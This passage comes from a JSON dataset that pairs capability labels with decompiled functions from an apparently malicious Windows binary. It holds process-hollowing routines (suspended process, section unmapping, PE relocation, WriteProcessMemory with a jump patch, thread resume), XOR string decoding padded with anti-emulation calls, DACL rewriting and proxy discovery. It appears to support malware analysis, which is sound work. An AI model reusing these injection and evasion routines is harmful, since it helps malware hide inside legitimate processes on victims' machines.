        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040625d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint lpflOldProtect;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar3 = &var_28h + 1;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *0x41cd40 = fcn.0040bb2f();\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00406f62();\n    iVar2 = fcn.00408c8d();\n    if (iVar2 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41ccc0 = *0x41ccc0 + (&var_1ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41ccc0 = *0x41ccc0 ^ 0x43103655;\n        fcn.004045dd();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(\"3333\", 0x184, 0x40, &lpflOldProtect);\n    fcn.0040b955();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(\"3333\", 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.0040d97a();\n    fcn.0040d97a();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41cd20);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41cd20);\n    iVar2 = fcn.004064b2(&var_ch);\n    if (iVar2 == 0) {\n        fcn.00406ef1();\n        fcn.00405d9a();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 621
    },
    "0040637a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040637a(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00406dcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406dcf(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00406e09;\n            } while (param_1[pcVar2] != '\\\\');\n            pcVar2 = param_1 + pcVar2;\n            if (pcVar2 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar2 + 1));\n                param_1 = pcVar2 + 1;\n            }\n        }\ncode_r0x00406e09:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar5 = pcVar2;\n            pcVar3 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar3 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar5 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar2[pcVar3] = '\\0';\n            (*_sym.imp.ntdll.dll__strupr)(pcVar2);\n            uVar4 = fcn.00403920();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 542
    },
    "00407378": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407378(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uchar *in_EDX;\n    int32_t *piVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    var_ch = *(in_EDX + iVar3 + 6);\n    iVar12 = *(in_EDX + iVar3 + 0x3c);\n    puVar11 = in_EDX;\n    puVar13 = in_ECX;\n    for (iVar7 = *(in_EDX + iVar3 + 0x54); iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar13 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    if (var_ch != 0) {\n        piVar10 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar8 = iVar12 + -1 + piVar10[-1] & ~(iVar12 - 1U);\n            if (uVar8 != 0) {\n                puVar11 = in_EDX + *piVar10;\n                puVar13 = in_ECX + piVar10[-2];\n                for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar13 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            piVar10 = piVar10 + 10;\n            var_ch = var_ch - 1;\n        } while (var_ch != 0);\n    }\n    if (arg_8h == NULL) {\n        arg_8h = in_ECX;\n    }\n    iVar12 = iVar3 + 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar12 = iVar3 + 0xb0;\n    }\n    iVar7 = *(in_EDX + iVar12);\n    if ((iVar7 != 0) && (uVar8 = *(in_EDX + iVar12 + 4),  uVar8 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar12 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar12 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar11 = *(in_EDX + iVar3 + 0x30);\n        uVar5 = arg_8h - *(in_EDX + iVar3 + 0x30);\n        iVar3 = *(in_EDX + iVar3 + 0x34);\n        piVar10 = in_ECX + iVar7;\n        for (; 8 < uVar8; uVar8 = uVar8 - *piVar9) {\n            iVar7 = *piVar10;\n            uVar14 = piVar10[1] - 8U >> 1;\n            if ((piVar10[1] <= uVar8) && (uVar14 != 0)) {\n                piVar9 = piVar10 + 2;\n                do {\n                    uVar2 = *piVar9;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar7) = arg_8h + (*(in_ECX + (uVar2 & 0xfff) + iVar7) - iVar12);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar6 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar6 + iVar7;\n                        uVar4 = *puVar1;\n                        *puVar1 = *puVar1 + uVar5;\n                        *(in_ECX + uVar6 + 4 + iVar7) =\n                             *(in_ECX + uVar6 + 4 + iVar7) + (((arg_8h >> 0x1f) - iVar3) - (arg_8h < puVar11)) +\n                             CARRY4(uVar4, uVar5);\n                    }\n                    piVar9 = piVar9 + 2;\n                    uVar14 = uVar14 - 1;\n                } while (uVar14 != 0);\n            }\n            piVar9 = piVar10 + 1;\n            piVar10 = piVar10 + piVar10[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1179
    },
    "00407b36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407b36(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040bf15;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    if (((arg_8h & 0x10) == 0) && ((*0x41cd38 & 1) != 0)) {\n        iVar3 = in_EDX[2];\n        var_20h = 0x41c620;\n    }\n    else {\n        iVar3 = *in_EDX;\n    }\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar6 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.004072b2(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00407270(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.00407378(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar6 + var_8h;\n            puVar4 = *in_EDX;\n            puVar7 = iVar1 + 0xc50;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar7 = var_8h + 0xc50 + in_EDX[4] + uVar6;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar5 = in_EDX;\n            puVar4 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = *piVar5;\n                piVar5 = piVar5 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar6;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = var_4h + 0xc50 + in_EDX[4] + uVar6;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41cd38 & 1) != 0)) {\n                iVar3 = fcn.0040781a();\n            }\n            else {\n                iVar3 = fcn.004074e1();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00407d0f(in_ECX, var_4h + uVar6 + 0x40, var_4h + uVar6, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            uVar2 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, var_8h);\n            (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar2);\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1191
    },
    "004084ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004084ec(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    int32_t *unaff_ESI;\n    int32_t *piVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uchar *puVar15;\n    uchar *puStack1008;\n    int32_t *piStack1004;\n    uint uStack1000;\n    int32_t *piStack996;\n    uint uStack992;\n    uchar *puStack984;\n    int32_t *piStack980;\n    uint uStack976;\n    int32_t *piStack972;\n    int32_t *piStack968;\n    uint uStack964;\n    uint uStack920;\n    int32_t iStack916;\n    uint uStack912;\n    int32_t iStack908;\n    uint uStack904;\n    uint uStack900;\n    uint uStack896;\n    uint uStack892;\n    uint32_t uStack888;\n    int32_t iStack884;\n    uchar uStack880;\n    uint uStack879;\n    uint uStack875;\n    uint uStack871;\n    ushort uStack867;\n    uchar uStack865;\n    uchar uStack864;\n    uint uStack863;\n    uint uStack859;\n    uchar uStack855;\n    ushort uStack854;\n    uint uStack848;\n    uint uStack844;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack796;\n    uchar auStack740 [96];\n    int32_t iStack644;\n    int32_t iStack628;\n    \n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x7a18514e;\n    uStack848 = 0;\n    uStack920 = 0;\n    uStack904 = 0;\n    uStack844 = 0;\n    puVar15 = &stack0xfffffcd4;\n    for (iVar10 = 0x44; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    uStack812 = 0x44;\n    puVar15 = &stack0xfffffcb8;\n    for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    uStack896 = 0x51186717;\n    uStack892 = 0x670b7a3f;\n    puVar15 = &stack0xfffffd1c;\n    for (iVar10 = 0x2cc; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    iStack884 = 0x51046701;\n    uStack880 = 0x3f;\n    for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    iStack908 = 6;\n    uStack864 = 6;\n    uStack888 = 0x7a195106;\n    uStack879 = 0x37674b7a;\n    uStack875 = 0x177a1851;\n    uStack871 = 0x3f511867;\n    uStack867 = 0xb7a;\n    uStack865 = 0x67;\n    uStack863 = 0x5c7a7851;\n    uStack859 = 0x4b513767;\n    uStack855 = 0x7a;\n    iStack916 = 0x7a4b516b;\n    uStack912 = CONCAT22(uStack912._2_2_, 0x676e);\n    uStack964 = 0x4085f6;\n    fcn.00401000(0x5c);\n    iVar10 = CONCAT22(uStack854, CONCAT11(uStack855, uStack859._3_1_));\n    iVar14 = 0;\n    do {\n        uStack964 = 0x40860a;\n        iVar7 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar7 != 0xf8b7e5) {\n            *(iVar14 + iVar10) = (&stack0xfffffc68)[iVar14 % uStack912] ^ (iVar14 + iVar10)[&stack0xfffffc78 + -iVar10];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x2e);\n    uStack964 = 0x104;\n    uStack976 = 0x40863b;\n    piStack972 = iVar10;\n    piStack968 = unaff_ESI;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    puStack984 = 0x408648;\n    piStack980 = unaff_ESI;\n    uStack976 = uVar5;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack984 = 0x40fb40;\n    uStack992 = 0x408650;\n    (*pcVar4)();\n    uStack992 = arg_8h;\n    uStack1000 = 0x408656;\n    piStack996 = unaff_ESI;\n    (*pcVar4)();\n    uStack1000 = 0x40fb48;\n    puStack1008 = 0x40865e;\n    piStack1004 = unaff_ESI;\n    (*pcVar4)();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while( true ) {\n        puStack1008 = &stack0xfffffc88;\n        iVar14 = (*pcVar4)(0, unaff_ESI, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffca4);\n        if (iVar14 != 0) break;\n        piStack1004 = 0x3e8;\n        puStack1008 = 0x408671;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    puStack1008 = NULL;\n    piStack1004 = unaff_ESI;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uStack796 = 0x10002;\n    piVar11 = *(uStack1000 + 0x3c) + uStack1000;\n    piStack972 = piVar11;\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack892, &stack0xfffffce4);\n    if (iVar14 != 0) {\n        iVar14 = fcn.004072b2(&stack0xfffffc38);\n        if ((iVar14 == 0) && (iVar14 = fcn.00407270(&stack0xfffffc70),  iVar14 == 0)) {\n            if (puStack984 != NULL) {\n                puVar6 = puStack1008;\n                puVar15 = puStack984;\n                for (iVar10 = piVar11[0x15]; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar15 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                uStack1000 = 0;\n                if (*(piVar11 + 6) != 0) {\n                    piStack1004 = *(piVar11 + 5) + 0x24 + piVar11;\n                    do {\n                        iVar10 = piStack1004[1];\n                        if (iVar10 != 0) {\n                            puVar6 = puStack1008 + *piStack1004;\n                            puVar15 = puStack984 + *piStack1004;\n                            for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n                                *puVar15 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                                puVar15 = puVar15 + 1;\n                            }\n                        }\n                        piStack1004 = piStack1004 + 10;\n                        uStack1000 = uStack1000 + 1;\n                    } while (uStack1000 < *(piVar11 + 6));\n                }\n                piVar12 = piVar11 + 0x28;\n                if (*(piVar11 + 1) == -0x799c) {\n                    piVar12 = piVar11 + 0x2c;\n                }\n                piStack1004 = uStack912 - piVar11[0xd];\n                uStack888 = uStack912 - piVar11[0xd];\n                iStack884 = (uStack912 >> 0x1f) - (uStack912 < piVar11[0xd]);\n                piStack996 = puStack1008 + *piVar12;\n                if ((*piVar12 != 0) && (piStack972 = piVar12[1],  piStack972 != NULL)) {\n                    while (0x8 < piStack972) {\n                        uStack1000 = piStack996[1] - 8U >> 1;\n                        iVar10 = *piStack996;\n                        if ((piStack996[1] <= piStack972) && (uStack1000 != 0)) {\n                            piVar11 = piStack996 + 2;\n                            uVar13 = uStack1000;\n                            do {\n                                uVar2 = *piVar11;\n                                puStack1008 = uVar2 >> 0xc;\n                                if (puStack1008 == 0x3) {\n                                    *(puStack984 + (uVar2 & 0xfff) + iVar10) =\n                                         *(puStack984 + (uVar2 & 0xfff) + iVar10) + piStack1004;\n                                }\n                                else if (puStack1008 == 0xa) {\n                                    uVar8 = uVar2 & 0xfff;\n                                    puVar1 = puStack984 + uVar8 + iVar10;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack888;\n                                    *(puStack984 + uVar8 + 4 + iVar10) =\n                                         *(puStack984 + uVar8 + 4 + iVar10) + iStack884 + CARRY4(uVar3, uStack888);\n                                }\n                                piVar11 = piVar11 + 2;\n                                uVar13 = uVar13 - 1;\n                            } while (uVar13 != 0);\n                        }\n                        piVar11 = piStack996 + 1;\n                        piStack996 = piStack996 + piStack996[1];\n                        piStack972 = piStack972 - *piVar11;\n                        piVar11 = piStack980;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar7 = piVar11[10] + iStack916;\n                iVar14 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(iStack908, iStack644 + 8, &stack0xfffffc8c, 4, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                iVar10 = iStack916;\n                if (iVar14 != 0) {\n                    iVar10 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc20, 1);\n                    if (iVar10 == 0) {\n                        uStack1000._0_1_ = 0xe9;\n                    }\n                    uStack1000 = uStack1000 & 0xffffff00 | uStack1000;\n                    iVar10 = (*pcVar4)(&stack0xfffffc19, 4);\n                    uVar5 = uStack920;\n                    if (iVar10 == 0) {\n                        uVar13 = (iVar7 - iStack628) - 5;\n                        puStack1008 = puStack1008 & 0xff | uVar13 * 0x100;\n                        piStack1004 = piStack1004 & 0xffffff00 | uVar13 >> 0x18;\n                    }\n                    iVar10 = 0;\n                    do {\n                        iVar14 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                           (uVar5, iVar10 + iStack644, &stack0xfffffc10 + iVar10, 1, 0);\n                        if (iVar14 == 0) break;\n                        iVar10 = iVar10 + 1;\n                    } while (iVar10 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(iStack916);\n                    iStack908 = 1;\n                    iVar10 = iStack916;\n                }\n                goto code_r0x00408931;\n            }\n        }\n        else {\ncode_r0x00408931:\n            if (puStack984 != NULL) {\n                uVar5 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, puStack984);\n                (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar5);\n            }\n        }\n        if (piStack968 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(piStack968);\n        }\n        if (iStack908 != 0) goto code_r0x00408981;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack904, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack912);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack912);\ncode_r0x00408981:\n    uVar5 = uStack904;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    return uVar5;\n}\n",
        "token_count": 3192
    },
    "00409658": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409658(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    int32_t lpcwszUrl;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *psz1;\n    int32_t pszSrch;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar10 = &pProxyConfig;\n    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    pszFile._0_2_ = 0;\n    psz1 = param_2;\n    sub.ntdll.dll_memset(&pszFile + 2, 0, 0x206);\n    var_14h = 0;\n    puVar10 = &pszFile;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar9 = param_2;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar5 != 0) && (iVar5 = fcn.004095fb(),  iVar5 != 0)) {\n        uVar7 = 1;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  param_2 = psz1,  iVar5 != 0)) {\n            bVar11 = pProxyConfig != 0;\n            var_50h = 0;\n            uStack80 = 0;\n            uStack76 = 0;\n            var_54h = bVar11;\n            pAutoProxyOptions = bVar11;\n            if (var_38h != 0) {\n                pAutoProxyOptions = bVar11 | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar10 = &pProxyInfo;\n            for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar5, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar6 == 0) || (psz2 == 0)) {\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n                pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                param_2 = psz1;\n                if (var_8h != 0) {\n                    (*pcVar1)(var_8h);\n                    param_2 = psz1;\n                }\n                goto code_r0x004097ba;\n            }\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar1)(var_8h);\n            }\ncode_r0x004099a3:\n            uVar7 = 1;\n            goto code_r0x0040994a;\n        }\ncode_r0x004097ba:\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x004097f3:\n                iVar5 = (*_sym.imp.ntdll.dll_wcschr)(var_34h, 0x3d);\n                if (iVar5 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(param_2, var_34h);\n                    goto code_r0x0040994a;\n                }\n                pProxyInfo = 0x4918742b;\n                psz2 = 0x6c044312;\n                var_8h = 0x7479663a;\n                var_4h._0_2_ = 0x496c;\n                var_1ch = 0x496c7443;\n                var_18h._0_1_ = 0x66;\n                fcn.00401000(0x1c);\n                iVar5 = pszSrch;\n                iVar8 = 0;\n                var_14h = 5;\n                iVar6 = &pProxyInfo - pszSrch;\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                    if (iVar3 != 0x192875) {\n                        *(iVar8 + iVar5) = *(&var_1ch + iVar8 % var_14h) ^ (iVar8 + iVar5)[iVar6];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xe);\n                pProxyInfo = 